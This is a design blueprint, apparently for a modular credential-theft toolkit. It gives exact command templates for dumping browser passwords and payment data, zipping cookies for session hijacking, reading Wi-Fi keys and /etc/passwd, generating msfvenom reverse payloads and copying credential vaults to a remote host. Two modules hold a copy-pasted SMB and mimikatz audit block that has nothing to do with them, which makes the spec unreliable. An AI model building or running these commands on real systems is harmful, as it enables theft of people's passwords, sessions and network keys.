# Saved Credentials — Category Blueprint

**Category:** `SAVED_CREDENTIALS` | **Slug:** `savedcreds` | **Tools Dir:** `~/jabber/jabber-tools/savedcreds/`
**Package:** `com.jabber.jabber.modules.credential` | **Group:** Data & Utilities

---

## ToolManager: `savedcreds/ToolManager.java`

| ID | Binary | Source | Version Check | Install Method |
|----|--------|--------|---------------|----------------|
| `sqlite3` | `sqlite3` | apt | `sqlite3 --version` | `apt_install` |
| `gpg` | `gpg` | apt (gnupg) | `gpg --version` | `apt_install` |
| `jq` | `jq` | apt | `jq --version` | `apt_install` |
| `openssl` | `openssl` | system | `openssl version` | system |
| `python3` | `python3` | system | `python3 --version` | system |
| `lazagne` | `lazagne` | pip | `lazagne --help` | `pip_install` |
| `csvtool` | `csvtool` | apt | `csvtool --version` | `apt_install` |
| `nmcli` | `nmcli` | system | `nmcli --version` | system |

---

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Saved Credentials** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between operations.
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for downloading results and logs.
4. **Live Terminal Stream**: A real-time stdout/stderr streaming component for operational transparency.
5. **Interactive Dashboard**: Real-time display of extracted data, payloads, or process progress.

---

---

## Modules

### 1. Browser Credential Recovery
**ID:** `cred-browser` | **Risk:** MEDIUM | **File:** `BrowserCredentialModule.java`
**Tools:** `lazagne`, `sqlite3`, `find`, `strings`, `python3`

#### Execution Modes:

- **`EXTR`** (Short Name: `EXTR`)
    - **Purpose**: Extraction of stored passwords and cookies from browser databases.
    - **Input Schema**: `{ browser: String, profile_path: String }`
    - **Multi-Tool Command Logic**:
        1. `lazagne browsers -<browser>` (Core Automated Dump)
        2. `sqlite3 <profile_path>/Login\ Data "SELECT origin_url, username_value, password_value FROM logins"` (Manual Extraction)
        3. `find <profile_path> -name "Cookies"` (Cookie Discovery)
        4. `strings <profile_path>/History | grep "login"` (History Audit)
        5. `python3 decrypt_browser.py <profile_path>` (Custom Decryption)
    - **Execution Flow**: Core Dump -> Manual Extraction -> Cookie Discovery -> History Audit -> Custom Decrypt.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXTRACT_[Timestamp]_browser_creds.json`: Decrypted browser passwords and site metadata.
        - `reports/artifacts/EXTRACT_[Timestamp]_cookies.zip`: Compressed browser cookie databases for session hijacking.
        - `reports/analysis/EXTRACT_[Timestamp]_browser_history.txt`: Filtered history log for login-related activity.

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Discovery of browser installations and profile metadata.
    - **Input Schema**: `{ search_root: String }`
    - **Multi-Tool Command Logic**:
        1. `find <search_root> -name "Login Data" 2>/dev/null` (Database Discovery)
        2. `find <search_root> -name "Cookies" 2>/dev/null` (Cookie Discovery)
        3. `lazagne browsers --help` (Binary Audit)
        4. `sqlite3 --version` (Binary Audit)
        5. `python3 --version` (Runtime Audit)
    - **Execution Flow**: Database Discovery -> Cookie Discovery -> Binary Audit x2 -> Runtime Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_profile_metadata.json`: Catalog of identified browser profiles and their paths.
        - `reports/artifacts/SCAN_[Timestamp]_dependency_status.json`: Verification of SQLite and Python runtime readiness.
        - `reports/analysis/SCAN_[Timestamp]_discovery_audit.txt`: Audit log of the recursive browser data search.

---

### 2. Chrome Password Recovery
**ID:** `cred-chrome` | **Risk:** MEDIUM | **File:** `ChromePassModule.java`
**Tools:** `sqlite3`, `python3`, `lazagne`, `find`, `strings`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify Chrome/Chromium profile paths and data structures.
    - **Input Schema**: `{ search_root: String }`
    - **Multi-Tool Command Logic**:
        1. `find <search_root> -name "Login Data" 2>/dev/null` (Core Path Discovery)
        2. `lazagne browsers -chrome --help` (Binary Check)
        3. `sqlite3 --version` (Dependency Check)
        4. `python3 --version` (Runtime Check)
        5. `strings <search_root>/Local\ State 2>/dev/null` (Encrypted Key Context)
    - **Execution Flow**: Path Discovery -> Binary Check -> Dependency Check -> Runtime Check -> Key Context.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_chrome_profiles.json`: Map of identified Chrome/Chromium data structures.
        - `reports/artifacts/SCAN_[Timestamp]_local_state.json`: Captured "Local State" file for decryption key extraction.
        - `reports/analysis/SCAN_[Timestamp]_runtime_audit.txt`: Status of all Chrome decryption dependencies.

- **`EXTR`** (Short Name: `EXTR`)
    - **Purpose**: Targeted extraction and decryption of Chrome credentials.
    - **Input Schema**: `{ profile_path: String }`
    - **Multi-Tool Command Logic**:
        1. `sqlite3 <profile_path>/Login\ Data "SELECT origin_url, username_value, password_value FROM logins"` (Core Extraction)
        2. `lazagne browsers -chrome` (Automated Extraction)
        3. `python3 decrypt_chrome.py <profile_path>` (Custom Decryption)
        4. `strings <profile_path>/Web\ Data` (Payment Method Disclosure)
        5. `find <profile_path> -name "History"` (History Audit)
    - **Execution Flow**: Core Extraction -> Automated Extraction -> Custom Decrypt -> Payment Disclosure -> History Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXTRACT_[Timestamp]_chrome_creds.json`: Decrypted Chrome credentials and associated URLs.
        - `reports/artifacts/EXTRACT_[Timestamp]_payment_methods.txt`: Disclosure of stored payment metadata (non-PCI data).
        - `reports/analysis/EXTRACT_[Timestamp]_custom_decryption.log`: Technical log of the Chrome decryption process.

---

### 3. App Config Extractor
**ID:** `cred-appconfig` | **Risk:** LOW | **File:** `ApplicationConfigModule.java`
**Tools:** `find`, `grep`, `strings`, `lazagne`, `cat`

#### Execution Modes:

- **`EXTR`** (Short Name: `EXTR`)
    - **Purpose**: Scan and extract passwords from various application configuration files.
    - **Input Schema**: `{ path: String }`
    - **Multi-Tool Command Logic**:
        1. `grep -riE "password|secret|key|token" <path>` (Core Keyword Search)
        2. `find <path> -name "*.xml" -o -name "*.json" -o -name "*.yml"` (Structure Discovery)
        3. `strings <path>/* | grep -E "[A-Za-z0-9+/]{40,}"` (Base64/Secret Audit)
        4. `lazagne all -path <path>` (Automated Audit)
        5. `cat <path>/config.php 2>/dev/null` (Specific File Disclosure)
    - **Execution Flow**: Keyword Search -> Structure Discovery -> Secret Audit -> Automated Audit -> Disclosure.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXTRACT_[Timestamp]_config_secrets.json`: List of secrets extracted from application configurations.
        - `reports/artifacts/EXTRACT_[Timestamp]_base64_blobs.txt`: Decoded Base64 and encrypted secret artifacts.
        - `reports/analysis/EXTRACT_[Timestamp]_config_inventory.json`: Inventory of all identified configuration files.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify permission security for configuration files.
    - **Input Schema**: `{ path: String }`
    - **Multi-Tool Command Logic**:
        1. `find <path> -writable -type f 2>/dev/null` (Writable Discovery)
        2. `ls -laR <path>` (Permission Inventory)
        3. `strings <path> | grep "chmod"` (Script Logic Audit)
        4. `lazagne config` (Config Specific Audit)
        5. `cat /etc/passwd` (System Context)
    - **Execution Flow**: Writable Discovery -> Permission Inventory -> Logic Audit -> Specific Audit -> System Context.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_permission_security.json`: Audit of configuration file permissions and risks.
        - `reports/artifacts/AUDIT_[Timestamp]_writable_files.txt`: List of configuration files with insecure write access.
        - `reports/analysis/AUDIT_[Timestamp]_system_context.txt`: System-level context for the permission audit.

---

### 4. Credential Vault Discovery
**ID:** `cred-vault` | **Risk:** MEDIUM | **File:** `CredentialVaultModule.java`
**Tools:** `lazagne`, `find`, `sqlite3`, `strings`, `gpg`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Discover and profile password manager vaults and encrypted databases.
    - **Input Schema**: `{ search_root: String }`
    - **Multi-Tool Command Logic**:
        1. `find <search_root> -name "*.kdbx" -o -name "*.db" -o -name "*.vault" 2>/dev/null` (Core Discovery)
        2. `lazagne all` (Automated Discovery)
        3. `sqlite3 --version` (Dependency Audit)
        4. `gpg --list-keys` (Keyring Audit)
        5. `strings <search_root>/.vault` (Metadata Disclosure)
    - **Execution Flow**: Core Discovery -> Automated Discovery -> Dependency Audit -> Keyring Audit -> Metadata.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_vault_inventory.json`: Catalog of all identified password manager vaults.
        - `reports/artifacts/SCAN_[Timestamp]_gpg_keyring.txt`: Audit of available GPG keys and identities.
        - `reports/analysis/SCAN_[Timestamp]_vault_metadata.txt`: Metadata disclosure from identified vault files.

- **`EXTR`** (Short Name: `EXTR`)
    - **Purpose**: Targeted extraction of vault metadata and encrypted blobs.
    - **Input Schema**: `{ vault_path: Path }`
    - **Multi-Tool Command Logic**:
        1. `sqlite3 <vault_path> .dump` (Core Blob Extraction)
        2. `strings <vault_path> | grep -i "user"` (Credential Mapping)
        3. `lazagne files -path <vault_path>` (Automated Extraction)
        4. `gpg --decrypt <vault_path> 2>/dev/null` (GPG Attempt)
        5. `find <vault_path> -ls` (Object Profile)
    - **Execution Flow**: Blob Extraction -> Mapping -> Automated Extraction -> GPG Attempt -> Profile.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXTRACT_[Timestamp]_vault_blobs.zip`: Compressed encrypted blobs extracted from vaults.
        - `reports/artifacts/EXTRACT_[Timestamp]_credential_map.json`: Map of identified users and metadata in the vault.
        - `reports/analysis/EXTRACT_[Timestamp]_extraction_telemetry.json`: Technical telemetry from the vault audit.

---

### 5. Browser History Dump
**ID:** `cred-history-dump` | **Risk:** LOW | **File:** `BrowserHistDumpModule.java`
**Tools:** `sqlite3`, `find`, `strings`, `cat`, `grep`

#### Execution Modes:

- **`DUMP`** (Short Name: `DUMP`)
    - **Purpose**: Extract browser history and navigation data for target intelligence.
    - **Input Schema**: `{ search_root: String }`
    - **Multi-Tool Command Logic**:
        1. `find <search_root> -name "History" -exec sqlite3 {} "SELECT url, title, last_visit_time FROM urls" \;` (Core History Extraction)
        2. `strings <search_root>/*History* | grep -i "http"` (Raw String Probe)
        3. `cat <search_root>/Places.sqlite` (Firefox Specific Audit)
        4. `grep -ri "login" <search_root>` (Keyword Audit)
        5. `sqlite3 --version` (Binary Audit)
    - **Execution Flow**: History Extraction -> Raw String Probe -> Firefox Audit -> Keyword Audit -> Binary Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/DUMP_[Timestamp]_browser_history.json`: Comprehensive report on extracted browser history.
        - `reports/artifacts/DUMP_[Timestamp]_history_strings.txt`: Raw HTTP strings extracted from history databases.
        - `reports/analysis/DUMP_[Timestamp]_visit_stats.json`: Statistical analysis of the most visited sites and titles.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 6. Wi-Fi Key Recovery
**ID:** `cred-wifi-dump` | **Risk:** MEDIUM | **File:** `WifiKeyDumpModule.java`
**Tools:** `nmcli`, `cat`, `grep`, `find`, `python3`

#### Execution Modes:

- **`DUMP`** (Short Name: `DUMP`)
    - **Purpose**: Extract stored Wi-Fi passwords and network profiles from the system.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `cat /etc/NetworkManager/system-connections/*` (Core Linux Wifi Dump)
        2. `nmcli -s -g NAME,UUID,TYPE,AUTOCONNECT connection show` (Connection Inventory)
        3. `grep -r "psk=" /etc/NetworkManager/` (Key Extraction)
        4. `find /etc/NetworkManager/system-connections/ -type f` (Profile Discovery)
        5. `python3 -c "import subprocess; ..."` (Platform Logic)
    - **Execution Flow**: Linux Dump -> Connection Inventory -> Key Extraction -> Profile Discovery -> Platform Logic.
    - **Output Generation & Artifacts**:
        - `reports/outputs/DUMP_[Timestamp]_wifi_keys.json`: List of identified Wi-Fi networks and their cleartext passwords.
        - `reports/artifacts/wifi_profiles.zip`: Collection of network connection profiles for offline analysis.
        - `reports/analysis/DUMP_[Timestamp]_interface_audit.json`: Audit of active and saved wireless interfaces.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 7. Credential Viewer Tool
**ID:** `cred-viewer` | **Risk:** LOW | **File:** `CredViewerModule.java`
**Tools:** `sqlite3`, `jq`, `gpg`, `openssl`, `cat`

#### Execution Modes:

- **`VIEW`** (Short Name: `VIEW`)
    - **Purpose**: Access and display raw credential records from the secure local vault.
    - **Input Schema**: `{ vault_path: Path }`
    - **Multi-Tool Command Logic**:
        1. `sqlite3 <vault_path> "SELECT * FROM credentials"` (Core Vault View)
        2. `cat <vault_path>` (Binary Integrity Check)
        3. `openssl version` (Binary Audit)
        4. `gpg --version` (Binary Audit)
        5. `jq --version` (Binary Audit)
    - **Execution Flow**: Core View -> Integrity Check -> Binary Audit x3.
    - **Output Generation & Artifacts**:
        - `reports/outputs/VIEW_[Timestamp]_vault_contents.json`: Structured export of all credential records in the vault.
        - `reports/artifacts/VIEW_[Timestamp]_integrity_check.txt`: Verification of the vault's binary integrity and checksum.
        - `reports/analysis/VIEW_[Timestamp]_tool_audit.json`: Status and version audit for sqlite3, gpg, and jq.

- **`SRCH`** (Short Name: `SRCH`)
    - **Purpose**: Query the vault for specific service, username, or target matches.
    - **Input Schema**: `{ vault_path: Path, query: String }`
    - **Multi-Tool Command Logic**:
        1. `sqlite3 <vault_path> "SELECT * FROM credentials WHERE service LIKE '%<query>%' OR username LIKE '%<query>%'"` (Core Vault Search)
        2. `jq -r '.[] | select(.service=="<query>")' <vault_path>.json` (JSON Backup Search)
        3. `cat <vault_path> | grep -i "<query>"` (Raw Binary Probe)
        4. `openssl dgst -sha256 <vault_path>` (Integrity Audit)
        5. `gpg --help` (Binary Check)
    - **Execution Flow**: Core Search -> JSON Search -> Raw Probe -> Integrity Audit -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SEARCH_[Timestamp]_search_results.json`: Filtered list of credentials matching the search query.
        - `reports/artifacts/SEARCH_[Timestamp]_integrity_audit.txt`: Checksum and integrity verification for the searched vault.
        - `reports/analysis/SEARCH_[Timestamp]_binary_status.json**: Verification of the sqlite3 and gpg tool status.

---

### 8. Credential Import Tool
**ID:** `cred-import` | **Risk:** LOW | **File:** `CredImportModule.java`
**Tools:** `sqlite3`, `jq`, `gpg`, `python3`, `csvtool`

#### Execution Modes:

- **`IMPR`** (Short Name: `IMPR`)
    - **Purpose**: Ingest and normalize credential data from heterogeneous external formats into the vault.
    - **Input Schema**: `{ vault_path: Path, import_path: Path, format: String }`
    - **Multi-Tool Command Logic**:
        1. `sqlite3 <vault_path> ".import <import_path> credentials"` (Core SQLite Import)
        2. `jq '.' <import_path>` (JSON Normalization)
        3. `csvtool readable <import_path>` (CSV Formatting)
        4. `python3 -c "import sqlite3; ..."` (Python Logic)
        5. `gpg --version` (Binary Audit)
    - **Execution Flow**: Core Import -> JSON Normalization -> CSV Formatting -> Python Logic -> Binary Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/IMPORT_[Timestamp]_import_summary.json`: Summary of successfully ingested and normalized records.
        - `reports/artifacts/IMPORT_[Timestamp]_normalized_data.json`: The raw import data after JSON/CSV normalization.
        - `reports/analysis/IMPORT_[Timestamp]_import_log.txt`: Technical log of the SQLite import and python logic execution.

- **`VALD`** (Short Name: `VALD`)
    - **Purpose**: Verify schema integrity and data sanity of import candidates.
    - **Input Schema**: `{ import_path: Path, format: String }`
    - **Multi-Tool Command Logic**:
        1. `jq '.' <import_path>` (Core JSON Validation)
        2. `csvtool -u TAB <import_path>` (CSV Delimiter Audit)
        3. `python3 -m json.tool <import_path>` (Alternative JSON Check)
        4. `sqlite3 :memory: ".read <import_path>"` (Memory-Table Probe)
        5. `gpg -v <import_path>` (Signature Audit)
    - **Execution Flow**: Core JSON -> CSV Audit -> Alt JSON -> Memory Probe -> Signature Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/VALID_[Timestamp]_sanity_report.json`: Detailed report on schema integrity and data sanity.
        - `reports/artifacts/VALID_[Timestamp]_signature_audit.txt`: Verification of cryptographic signatures for the import file.
        - `reports/analysis/VALID_[Timestamp]_memory_probe.log`: Log of the memory-table probe and SQL syntax check.

---

### 9. Credential Export Tool
**ID:** `cred-export` | **Risk:** MEDIUM | **File:** `CredExportModule.java`
**Tools:** `sqlite3`, `jq`, `gpg`, `openssl`, `tar`

#### Execution Modes:

- **`EXPR`** (Short Name: `EXPR`)
    - **Purpose**: Extract and format vault records for external archiving or reporting.
    - **Input Schema**: `{ vault_path: Path, format: String }`
    - **Multi-Tool Command Logic**:
        1. `sqlite3 <vault_path> ".mode <format>" "SELECT * FROM credentials"` (Core SQLite Export)
        2. `jq -n --argfile data <vault_path>.json '$data'` (JSON Prettify)
        3. `tar -cvf credentials.tar <vault_path>` (Archive Packing)
        4. `openssl dgst -sha256 <vault_path>` (Checksum Generation)
        5. `gpg --version` (Binary Audit)
    - **Execution Flow**: Core Export -> JSON Prettify -> Archive Packing -> Checksum Gen -> Binary Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXPORT_[Timestamp]_vault_export.[Ext]`: Formatted export of vault records in the requested format.
        - `reports/artifacts/EXPORT_[Timestamp]_credentials_archive.tar`: Compressed archive of the vault and associated metadata.
        - `reports/analysis/EXPORT_[Timestamp]_checksum_gen.json`: SHA256 checksum and integrity report for the exported asset.

- **`ENCR`** (Short Name: `ENCR`)
    - **Purpose**: Securely encrypt exported credential sets for protected storage or transfer.
    - **Input Schema**: `{ vault_path: Path, key: String }`
    - **Multi-Tool Command Logic**:
        1. `openssl enc -aes-256-cbc -salt -in <vault_path> -out <vault_path>.enc -k <key>` (Core OpenSSL Enc)
        2. `gpg --symmetric --batch --passphrase <key> <vault_path>` (GPG Backup Enc)
        3. `tar -czvf - <vault_path> | openssl enc -aes-256-cbc -salt -k <key>` (Archived Stream Enc)
        4. `jq --version` (Binary Check)
        5. `sqlite3 --version` (Binary Check)
    - **Execution Flow**: Core OpenSSL -> GPG Backup -> Archived Stream -> Binary Check x2.
    - **Output Generation & Artifacts**:
        - `reports/payloads/ENCRYPT_[Timestamp]_vault_secure.enc`: AES-256-CBC encrypted version of the exported vault.
        - `reports/artifacts/ENCRYPT_[Timestamp]_gpg_backup.gpg`: Symmetric GPG backup of the credential set.
        - `reports/analysis/ENCRYPT_[Timestamp]_encryption_stats.json`: Metadata on encryption algorithm and key handling.

---

### 10. Password Strength Analyzer
**ID:** `cred-analyzer` | **Risk:** LOW | **File:** `PassAnalyzerModule.java`
**Tools:** `python3`, `hashid`, `john`, `hashcat`, `sqlite3`

#### Execution Modes:

- **`ANAL`** (Short Name: `ANAL`)
    - **Purpose**: Evaluate credential strength and entropy to identify weak points in identity security.
    - **Input Schema**: `{ password: Password }`
    - **Multi-Tool Command Logic**:
        1. `python3 -c "import zxcvbn; print(zxcvbn.zxcvbn('<password>'))"` (Core Entropy Audit)
        2. `john --test` (Performance Audit)
        3. `hashcat -b` (Hardware Benchmark)
        4. `sqlite3 :memory: "SELECT length('<password>')"` (Basic Logic Check)
        5. `hashid -m` (Format Inventory)
    - **Execution Flow**: Core Entropy -> Performance Audit -> Hardware Benchmark -> Logic Check -> Format Inventory.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ANALYZ_[Timestamp]_entropy_results.json`: Comprehensive report on password strength and entropy.
        - `reports/artifacts/ANALYZ_[Timestamp]_benchmark_stats.json`: Hardware benchmarking results for cracking performance.
        - `reports/analysis/ANALYZ_[Timestamp]_format_inventory.json`: Inventory of all identified credential and hash formats.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Batch audit of vault credentials against known weak password datasets.
    - **Input Schema**: `{ vault_path: Path }`
    - **Multi-Tool Command Logic**:
        1. `sqlite3 <vault_path> "SELECT password FROM credentials"` (Credential Extraction)
        2. `john --wordlist=rockyou.txt --format=raw-md5 hashes.txt` (Wordlist Audit)
        3. `python3 entropy_stats.py <vault_path>` (Statistical Audit)
        4. `hashid --help` (Binary Check)
        5. `hashcat --version` (Binary Check)
    - **Execution Flow**: Extraction -> Wordlist Audit -> Statistical Audit -> Binary Check x2.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_batch_audit.json`: Results of the batch vault audit against weak password datasets.
        - `reports/artifacts/AUDIT_[Timestamp]_statistical_audit.txt`: Statistical analysis of password patterns across the vault.
        - `reports/analysis/AUDIT_[Timestamp]_tool_readiness.json`: Verification of john, hashcat, and hashid status.

---

### 11. MSF Payload Wrapper
**ID:** `cred-msfvenom` | **Risk:** HIGH | **File:** `MSFVenumWrapModule.java`
**Tools:** `msfvenom`, `msfconsole`, `file`, `strings`, `openssl`

#### Execution Modes:

- **`GEN`** (Short Name: `GEN`)
    - **Purpose**: Generate high-fidelity payloads for capturing credentials during exploitation.
    - **Input Schema**: `{ payload: String, lhost: String, lport: int, format: String }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> -f <format>` (Core Payload Gen)
        2. `file output.<format>` (Format Verification)
        3. `strings output.<format> | grep -i "http"` (Metadata Audit)
        4. `openssl dgst -sha256 output.<format>` (Integrity Audit)
        5. `msfconsole -v` (Framework Check)
    - **Execution Flow**: Core Gen -> Format Verify -> Metadata Audit -> Integrity Audit -> Framework Check.
    - **Output Generation & Artifacts**:
        - `reports/payloads/GEN_[Timestamp]_capture_payload.[Ext]`: Generated credential capture payload in the specified format.
        - `reports/artifacts/GEN_[Timestamp]_metadata_audit.txt`: Audit of embedded strings and metadata in the payload.
        - `reports/analysis/GEN_[Timestamp]_framework_status.json`: Verification of the Metasploit framework and msfvenom status.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Disassemble and inspect generated payloads for hidden strings or signatures.
    - **Input Schema**: `{ payload_path: Path }`
    - **Multi-Tool Command Logic**:
        1. `strings <payload_path>` (Core String Extraction)
        2. `file <payload_path>` (Core Format Audit)
        3. `msfvenom --help-formats` (Format Inventory)
        4. `openssl version` (Binary Check)
        5. `msfconsole -x "version"` (Framework Audit)
    - **Execution Flow**: String Extraction -> Format Audit -> Format Inventory -> Binary Check -> Framework Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_payload_inspection.json`: Detailed report on hidden strings and signatures in the payload.
        - `reports/artifacts/AUDIT_[Timestamp]_format_inventory.json`: Inventory of all payload formats supported for inspection.
        - `reports/analysis/AUDIT_[Timestamp]_binary_status.json`: Verification of strings, file, and openssl readiness.

---

### 12. Credential Vault Syncer
**ID:** `cred-vault-sync` | **Risk:** MEDIUM | **File:** `VaultSyncModule.java`
**Tools:** `sqlite3`, `gpg`, `rsync`, `scp`, `openssl`

#### Execution Modes:

- **`SYNC`** (Short Name: `SYNC`)
    - **Purpose**: Securely synchronize the local credential vault with a remote JABBER relay.
    - **Input Schema**: `{ remote_host: String, remote_path: String }`
    - **Multi-Tool Command Logic**:
        1. `rsync -avz <local_vault> <remote_host>:<remote_path>` (Core Rsync Sync)
        2. `scp -P 22 <local_vault> <remote_host>:<remote_path>` (SCP Backup Sync)
        3. `gpg --encrypt --recipient <id> <local_vault>` (Pre-Sync Encryption)
        4. `openssl dgst -sha256 <local_vault>` (Sync Integrity)
        5. `sqlite3 <local_vault> "VACUUM"` (Vault Optimization)
    - **Execution Flow**: Core Sync -> SCP Backup -> Encryption -> Integrity -> Optimization.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SYNC_[Timestamp]_sync_summary.json`: Detailed report on the synchronization and encryption status.
        - `reports/artifacts/SYNC_[Timestamp]_vault_optimized.db`: Vacuumed and optimized version of the vault for transfer.
        - `reports/analysis/SYNC_[Timestamp]_integrity_report.txt`: End-to-end SHA256 integrity report for the synced asset.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify remote vault liveness and synchronization status.
    - **Input Schema**: `{ remote_host: String }`
    - **Multi-Tool Command Logic**:
        1. `ssh <remote_host> "ls -la"` (Remote Liveness Audit)
        2. `rsync --version` (Binary Check)
        3. `scp --help` (Binary Check)
        4. `gpg --version` (Binary Check)
        5. `openssl version` (Binary Check)
    - **Execution Flow**: Remote Liveness -> Binary Check x4.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_remote_status.json`: Verification of the remote JABBER relay liveness and status.
        - `reports/artifacts/AUDIT_[Timestamp]_binary_versions.json`: Version inventory for rsync, scp, gpg, and openssl.
        - `reports/analysis/AUDIT_[Timestamp]_connection_telemetry.log`: Log of the remote SSH connectivity and liveness audit.
